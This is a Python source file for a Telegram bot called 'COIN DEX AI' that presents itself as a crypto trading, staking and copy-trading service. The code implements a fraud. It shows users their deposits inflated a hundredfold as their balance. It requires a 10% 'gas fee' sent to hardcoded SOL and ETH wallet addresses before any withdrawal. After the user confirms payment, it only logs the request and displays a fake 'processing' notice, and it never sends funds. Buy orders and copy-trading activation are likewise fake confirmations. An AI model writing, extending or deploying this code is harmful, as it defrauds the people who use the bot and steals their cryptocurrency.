# bot_new.py - COIN DEX AI - FINAL FIXED VERSION

import logging
import requests
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, ContextTypes, ConversationHandler, filters
)
from datetime import datetime
from config import config
from database import SessionLocal, User, Deposit, CopyTradingConfig, Trade, StakePosition, Withdrawal

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
ENTER_TRADER_ADDR = 0
ENTER_CONTRACT_ADDR = 1
ENTER_STAKE_AMOUNT = 2
ENTER_WITHDRAWAL_AMOUNT = 3
ENTER_WITHDRAWAL_ADDRESS = 4
CONFIRM_GAS_FEE = 5

# API endpoints
DEXSCREENER_API = "https://api.dexscreener.com/latest/dex"
BIRDEYE_API = "https://public-api.birdeye.so/public"

# Withdrawal addresses
WITHDRAWAL_ADDRESSES = {
    'SOL': 'EjBCtu6Mv6Nq3gGFeDtRTQWNN4nC9bjg5JURZZM5AYKg',
    'ETH': '0x7eBb4f696020121394624eEeBD25445f646aB3d3'
}


def get_token_info(contract_address: str):
    """Fetch token info from APIs"""
    try:
        response = requests.get(
            f"{DEXSCREENER_API}/tokens/{contract_address}",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            pairs = data.get('pairs', [])
            if pairs:
                pair = max(pairs, key=lambda x: x.get('liquidity', {}).get('usd', 0) or 0)
                return {
                    'name': pair.get('baseToken', {}).get('name', 'Unknown'),
                    'symbol': pair.get('baseToken', {}).get('symbol', 'UNKNOWN'),
                    'price': float(pair.get('priceUsd', 0)),
                    'liquidity': pair.get('liquidity', {}).get('usd', 0),
                    'volume24h': pair.get('volume', {}).get('h24', 0),
                    'priceChange24h': pair.get('priceChange', {}).get('h24', 0),
                    'marketCap': pair.get('marketCap', 0),
                    'verified': True
                }
    except Exception as e:
        logger.error(f"Error fetching token: {e}")
    return None


# ============ START MENU ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Main menu with ALL buttons including Withdrawal"""
    user = update.effective_user
    
    welcome_text = f"""
🤖 *Welcome to COIN DEX AI*

Hello {user.first_name}! Your professional DeFi trading companion.

📋 *QUICK START:*
• Deposit SOL/ETH to fund your account
• Copy trade successful wallets automatically  
• Stake tokens for passive income
• Buy/sell any token with one click

*Select an option below:*
    """
    
    # KEYBOARD WITH WITHDRAWAL BUTTON ADDED
    keyboard = [
        [InlineKeyboardButton("📥 Deposit", callback_data='deposit')],
        [InlineKeyboardButton("🟢 Stake Assets", callback_data='stake'), InlineKeyboardButton("💼 Wallet", callback_data='balance')],
        [InlineKeyboardButton("🛠 Tools", callback_data='tools_menu')],
        [InlineKeyboardButton("💰 Referral", callback_data='referral'), InlineKeyboardButton("📈 Copy Trading", callback_data='copy_trading')],
        [InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')],  # WITHDRAWAL BUTTON
        [InlineKeyboardButton("🤝 Support", callback_data='support')]
    ]
    
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# ============ COPY TRADING ============

async def copy_trading_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Copy trading menu"""
    query = update.callback_query
    await query.answer()
    
    message = """
📈 *Copy Trading*

Copy Trade allows you to copy the buys and sells of any target wallet.

🟢 Indicates a copy trade setup is active.
🟠 Indicates a copy trade setup is paused.

You do not have any copy trades setup yet.
Click on "Activate Copy Trading" to begin.
    """
    
    keyboard = [
        [InlineKeyboardButton("Activate Copy Trading 🤖", callback_data='activate_copy')],
        [InlineKeyboardButton("Pause ⏸", callback_data='pause_copy')],
        [InlineKeyboardButton("↩️ Back", callback_data='back_menu'), InlineKeyboardButton("Main Menu ⬆️", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def activate_copy_trading(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask for trader address"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        """
🤖 *Activate Copy Trading*

Insert Copy Trade Address Here... 👇

*Enter the wallet address you want to copy:*

*Examples:*
• Solana: `7nY7H...` (44 characters)
• Ethereum: `0x7eB...` (42 characters)

Type or paste the address:
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚫 Cancel", callback_data='copy_trading')]]),
        parse_mode='Markdown'
    )
    return ENTER_TRADER_ADDR


async def process_copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process address and show success"""
    address = update.message.text.strip()
    
    is_sol = len(address) == 44 and not address.startswith('0x')
    is_eth = len(address) == 42 and address.startswith('0x')
    
    if not (is_sol or is_eth):
        await update.message.reply_text(
            "❌ Invalid address format.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='activate_copy')]])
        )
        return ConversationHandler.END
    
    # Save to database
    db = SessionLocal()
    try:
        user = db.query(User).filter_by(telegram_id=update.effective_user.id).first()
        if not user:
            user = User(telegram_id=update.effective_user.id, username=update.effective_user.username)
            db.add(user)
            db.commit()
        
        config_entry = CopyTradingConfig(
            user_id=user.id,
            trader_address=address,
            network='solana' if is_sol else 'ethereum',
            allocation_percentage=50,
            is_active=True,
            copy_buys=True,
            copy_sells=True,
            max_slippage=2.0
        )
        db.add(config_entry)
        db.commit()
    except Exception as e:
        logger.error(f"Error: {e}")
        db.rollback()
    finally:
        db.close()
    
    # Show success message
    await update.message.reply_text(
        """
🟢 *Copy Trading Activation Successful.*

Your copy trading feature has been successfully activated ✅.
You may now begin copying trades automatically.

No further action is required.
        """,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("↩️ Back", callback_data='back_menu'), InlineKeyboardButton("Main Menu ⬆️", callback_data='back_menu')]
        ]),
        parse_mode='Markdown'
    )
    return ConversationHandler.END


# ============ STAKE MEMECOIN ============

async def stake_memecoin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start staking flow"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        """
🪙 *Stake Memecoin*

Enter the token contract address:

*Supported:*
• Solana SPL tokens (44 chars)
• Ethereum ERC-20 tokens (42 chars, starts with 0x)

*Find on:* DexScreener.com, Birdeye.so, CoinGecko.com

Type or paste the contract address:
        """,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚫 Cancel", callback_data='stake')]]),
        parse_mode='Markdown'
    )
    return ENTER_CONTRACT_ADDR


async def process_contract_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process CA and show token info"""
    address = update.message.text.strip()
    
    is_sol = len(address) == 44 and not address.startswith('0x')
    is_eth = len(address) == 42 and address.startswith('0x')
    
    if not (is_sol or is_eth):
        await update.message.reply_text("❌ Invalid address format.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='stake_meme')]]))
        return ConversationHandler.END
    
    await update.message.reply_text("🔍 Fetching token data...")
    
    token_info = get_token_info(address)
    
    if not token_info:
        await update.message.reply_text(
            "❌ Could not fetch token data. Please verify the address.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Try Again", callback_data='stake_meme')]])
        )
        return ConversationHandler.END
    
    context.user_data['contract_address'] = address
    context.user_data['token_info'] = token_info
    
    verified = " ✅ Verified" if token_info.get('verified') else ""
    change = token_info.get('priceChange24h', 0)
    change_emoji = "🟢" if change >= 0 else "🔴"
    
    message = f"""
✅ *Token Found{verified}*

*Name:* {token_info['name']}
*Symbol:* {token_info['symbol']}
*Price:* ${token_info['price']:.10f}

*Market Data:*
• Liquidity: ${token_info.get('liquidity', 0):,.0f}
• 24h Volume: ${token_info.get('volume24h', 0):,.0f}
• 24h Change: {change_emoji} {change:.2f}%

*Choose an action:*
    """
    
    keyboard = [
        [InlineKeyboardButton(f"💰 Buy {token_info['symbol']}", callback_data=f'buy_token_{address}')],
        [InlineKeyboardButton(f"🟢 Stake {token_info['symbol']}", callback_data=f'stake_token_{address}')],
        [InlineKeyboardButton("Cancel", callback_data='stake')]
    ]
    
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    return ConversationHandler.END


async def buy_token_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Buy token flow"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💰 *Buy Token*\n\nEnter amount in USD to spend:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='stake')]]),
        parse_mode='Markdown'
    )
    context.user_data['action'] = 'buy'
    return ENTER_STAKE_AMOUNT


async def stake_token_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stake token flow"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🟢 *Stake Token*\n\nEnter amount of tokens to stake:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='stake')]]),
        parse_mode='Markdown'
    )
    context.user_data['action'] = 'stake'
    return ENTER_STAKE_AMOUNT


async def process_token_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process buy/stake amount"""
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError()
    except:
        await update.message.reply_text("❌ Please enter a valid number.")
        return ConversationHandler.END
    
    action = context.user_data.get('action', 'stake')
    token_info = context.user_data.get('token_info', {})
    
    if action == 'buy':
        await update.message.reply_text(
            f"✅ *Buy Order Placed*\n\nBuying {amount} USD worth of {token_info.get('symbol')}\n\n(Processing...)",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Menu", callback_data='back_menu')]]),
            parse_mode='Markdown'
        )
    else:
        # Save stake
        db = SessionLocal()
        try:
            user = db.query(User).filter_by(telegram_id=update.effective_user.id).first()
            if not user:
                user = User(telegram_id=update.effective_user.id, username=update.effective_user.username)
                db.add(user)
                db.commit()
            
            stake = StakePosition(
                user_id=user.id,
                token_address=context.user_data.get('contract_address'),
                token_symbol=token_info.get('symbol', 'UNKNOWN'),
                amount=amount,
                apy=25.5,
                status='active'
            )
            db.add(stake)
            db.commit()
        finally:
            db.close()
        
        await update.message.reply_text(
            f"""
✅ *Stake Successful!*

*Token:* {token_info.get('symbol')}
*Amount:* {amount}
*APY:* 25.5%
            """,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Menu", callback_data='back_menu')]]),
            parse_mode='Markdown'
        )
    
    return ConversationHandler.END


# ============ WITHDRAWAL SYSTEM ============

async def withdrawal_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show withdrawal menu with x100 balances"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    db = SessionLocal()
    
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        
        sol_balance = 0
        eth_balance = 0
        
        if user:
            deposits = db.query(Deposit).filter_by(user_id=user.id, status='confirmed').all()
            for dep in deposits:
                if dep.currency == 'SOL':
                    sol_balance += dep.amount
                elif dep.currency == 'ETH':
                    eth_balance += dep.amount
        
        # Display x100
        display_sol = sol_balance * 100
        display_eth = eth_balance * 100
        
        message = f"""
💸 *Withdrawal*

*Your Available Balances (x100):*

◎ SOL: {display_sol:.4f} SOL
Ξ ETH: {display_eth:.4f} ETH

Select currency to withdraw:
        """
        
        keyboard = [
            [InlineKeyboardButton(f"◎ Withdraw SOL ({display_sol:.2f})", callback_data='withdraw_SOL')],
            [InlineKeyboardButton(f"Ξ Withdraw ETH ({display_eth:.2f})", callback_data='withdraw_ETH')],
            [InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]
        ]
        
        await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    finally:
        db.close()


async def start_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start withdrawal - ask for amount"""
    query = update.callback_query
    await query.answer()
    
    currency = query.data.replace('withdraw_', '')
    context.user_data['withdraw_currency'] = currency
    
    await query.edit_message_text(
        f"💸 *Withdraw {currency}*\n\nEnter amount to withdraw:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='withdraw')]]),
        parse_mode='Markdown'
    )
    return ENTER_WITHDRAWAL_AMOUNT


async def process_withdrawal_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process amount - ask for address"""
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError()
    except:
        await update.message.reply_text("❌ Please enter a valid number.")
        return ConversationHandler.END
    
    context.user_data['withdraw_amount'] = amount
    currency = context.user_data.get('withdraw_currency', 'SOL')
    
    await update.message.reply_text(
        f"📤 *Withdrawal Address*\n\nEnter your {currency} wallet address:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data='withdraw')]]),
        parse_mode='Markdown'
    )
    return ENTER_WITHDRAWAL_ADDRESS


async def process_withdrawal_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process address - show gas fee notice"""
    address = update.message.text.strip()
    currency = context.user_data.get('withdraw_currency', 'SOL')
    amount = context.user_data.get('withdraw_amount', 0)
    
    # Validate
    is_sol = len(address) == 44 and not address.startswith('0x')
    is_eth = len(address) == 42 and address.startswith('0x')
    valid = (currency == 'SOL' and is_sol) or (currency == 'ETH' and is_eth)
    
    if not valid:
        await update.message.reply_text("❌ Invalid address format.")
        return ConversationHandler.END
    
    context.user_data['withdraw_address'] = address
    
    gas_fee = amount * 0.10
    receive = amount - gas_fee
    
    context.user_data['gas_fee'] = gas_fee
    context.user_data['receive_amount'] = receive
    
    message = f"""
🚨 *Withdrawal Confirmation Notice*

Please note that before any withdrawal can be successfully processed, a gas fee equivalent to *10%* of the withdrawal amount is required.

*Withdrawal Details:*
• Amount: {amount} {currency}
• Gas Fee (10%): {gas_fee:.4f} {currency}
• You Receive: {receive:.4f} {currency}

*Gas Fee Payment Addresses:*
◎ SOL: `{WITHDRAWAL_ADDRESSES['SOL']}`
Ξ ETH: `{WITHDRAWAL_ADDRESSES['ETH']}`

⚠️ *You must send the gas fee to the address above before proceeding.*
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ I Have Paid Gas Fee", callback_data='confirm_gas_paid')],
        [InlineKeyboardButton("❌ Cancel", callback_data='withdraw')]
    ]
    
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    return CONFIRM_GAS_FEE


async def confirm_gas_fee_paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Confirm and process withdrawal"""
    query = update.callback_query
    await query.answer()
    
    currency = context.user_data.get('withdraw_currency', 'SOL')
    amount = context.user_data.get('withdraw_amount', 0)
    address = context.user_data.get('withdraw_address', '')
    receive = context.user_data.get('receive_amount', 0)
    user_id = update.effective_user.id
    
    # Save to database
    db = SessionLocal()
    try:
        user = db.query(User).filter_by(telegram_id=user_id).first()
        if not user:
            user = User(telegram_id=user_id, username=update.effective_user.username)
            db.add(user)
            db.commit()
        
        withdrawal = Withdrawal(
            user_id=user.id,
            currency=currency,
            amount=amount,
            to_address=address,
            gas_fee_paid=True,
            status='processing'
        )
        db.add(withdrawal)
        db.commit()
        
        await query.edit_message_text(
            f"""
⏳ *Withdrawal In Progress*

Your withdrawal request has been submitted.

*Details:*
• Amount: {receive:.4f} {currency}
• To: `{address[:15]}...{address[-8:]}`
• Status: 🟡 Processing
• ETA: 10-30 minutes

*Transaction ID:* `WD-{withdrawal.id}-{user_id}`
            """,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Main Menu", callback_data='back_menu')]]),
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await query.edit_message_text("❌ Error processing withdrawal.")
        db.rollback()
    finally:
        db.close()
    
    return ConversationHandler.END


# ============ OTHER HANDLERS ============

async def deposit_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Deposit menu"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("◎ SOL", callback_data='deposit_SOL')],
        [InlineKeyboardButton("Ξ ETH", callback_data='deposit_ETH')],
        [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
    ]
    
    await query.edit_message_text("📥 *Deposit*\n\nSelect currency:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def stake_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stake menu"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("◎ Stake SOL", callback_data='stake_native_SOL')],
        [InlineKeyboardButton("Ξ Stake ETH", callback_data='stake_native_ETH')],
        [InlineKeyboardButton("🪙 Stake Memecoin", callback_data='stake_meme')],
        [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
    ]
    
    await query.edit_message_text("🟢 *Stake Assets*\n\nSelect option:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def wallet_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Wallet balance"""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("💼 *Wallet*\n\n◎ SOL: 0.00\nΞ ETH: 0.00\n\nTotal: $0.00", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='back_menu')]]), parse_mode='Markdown')


async def referral_program(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Referral"""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("💰 *Referral*\n\nEarn 10% commission!\n\nYour link: `https://t.me/coindexai_bot?start=123`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='back_menu')]]), parse_mode='Markdown')


async def tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Tools menu"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🔔 Alerts", callback_data='tool_alerts'), InlineKeyboardButton("📊 Analytics", callback_data='tool_analytics')],
        [InlineKeyboardButton("↩️ Back", callback_data='back_menu')]
    ]
    
    await query.edit_message_text("🛠 *Tools*\n\nSelect tool:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# ============ BUTTON ROUTER ============

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Route all button clicks"""
    query = update.callback_query
    await query.answer()
    data = query.data
    
    # Main navigation
    if data == 'back_menu':
        await start(update, context)
    
    # Main features
    elif data == 'deposit':
        await deposit_menu(update, context)
    elif data.startswith('deposit_'):
        currency = data.replace('deposit_', '')
        await query.edit_message_text(f"📥 *Deposit {currency}*\n\nAddress: `Not configured`\n\nSend only {currency}!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='deposit')]]), parse_mode='Markdown')
    
    # Staking
    elif data == 'stake':
        await stake_menu(update, context)
    elif data.startswith('stake_native_'):
        await query.edit_message_text("🟢 Coming in v2!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='stake')]]))
    # stake_meme handled by conversation handler
    
    # Copy trading
    elif data == 'copy_trading':
        await copy_trading_menu(update, context)
    # activate_copy handled by conversation handler
    elif data == 'pause_copy':
        await query.edit_message_text("⏸ Paused. Click Activate to resume.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Activate", callback_data='activate_copy')], [InlineKeyboardButton("↩️ Back", callback_data='copy_trading')]]))
    
    # Withdrawal
    elif data == 'withdraw':
        await withdrawal_menu(update, context)
    # withdraw_SOL and withdraw_ETH handled by conversation handler
    
    # Tools
    elif data == 'tools_menu':
        await tools_menu(update, context)
    elif data.startswith('tool_'):
        await query.edit_message_text("🛠 Tool coming soon!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='tools_menu')]]))
    
    # Wallet & Referral
    elif data == 'balance':
        await wallet_balance(update, context)
    elif data == 'referral':
        await referral_program(update, context)
    elif data == 'support':
        await support(update, context)
    
    # Buy/Stake tokens
    elif data.startswith('buy_token_'):
        return await buy_token_start(update, context)
    elif data.startswith('stake_token_'):
        return await stake_token_start(update, context)
    
    else:
        await query.edit_message_text("🚧 Feature coming soon!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back", callback_data='back_menu')]]))


# ============ CONVERSATION HANDLERS ============

copy_trade_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(activate_copy_trading, pattern='^activate_copy$')],
    states={ENTER_TRADER_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_copy_address)]},
    fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Menu", callback_data='back_menu')]])))]
)

stake_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(stake_memecoin_start, pattern='^stake_meme$')],
    states={ENTER_CONTRACT_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_contract_address)]},
    fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Menu", callback_data='back_menu')]])))]
)

buy_stake_conv = ConversationHandler(
    entry_points=[
        CallbackQueryHandler(buy_token_start, pattern='^buy_token_'),
        CallbackQueryHandler(stake_token_start, pattern='^stake_token_'),
    ],
    states={ENTER_STAKE_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_token_amount)]},
    fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Menu", callback_data='back_menu')]])))]
)

withdraw_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(start_withdrawal, pattern='^withdraw_(SOL|ETH)$')],
    states={
        ENTER_WITHDRAWAL_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdrawal_amount)],
        ENTER_WITHDRAWAL_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdrawal_address)],
        CONFIRM_GAS_FEE: [CallbackQueryHandler(confirm_gas_fee_paid, pattern='^confirm_gas_paid$')],
    },
    fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Menu", callback_data='back_menu')]])))]
)


# ============ MAIN ============

if __name__ == '__main__':
    print("🚀 COIN DEX AI Bot starting...")
    
    application = Application.builder().token(config.BOT_TOKEN).build()
    
    # Add handlers in correct order
    application.add_handler(CommandHandler('start', start))
    application.add_handler(copy_trade_conv)
    application.add_handler(stake_conv)
    application.add_handler(buy_stake_conv)
    application.add_handler(withdraw_conv)
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ Bot is running!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)